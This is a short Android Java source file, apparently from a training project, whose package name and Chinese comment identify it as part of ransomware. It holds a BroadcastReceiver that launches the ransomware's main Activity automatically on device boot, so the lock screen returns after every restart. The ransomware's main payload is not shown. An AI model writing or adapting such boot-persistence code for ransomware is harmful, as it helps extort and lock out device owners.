package com.itheima.lesuo;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.sax.StartElementListener;
import android.widget.Toast;

public class BootReceiver extends BroadcastReceiver
{
	@Override
	public void onReceive(Context context, Intent intent) {
		// 启动Activity，实现开机自动启动勒索软件
		Intent it = new Intent(context, MainActivity.class);
		//创建任务栈存放启动的Activity
		it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(it);
	}

}
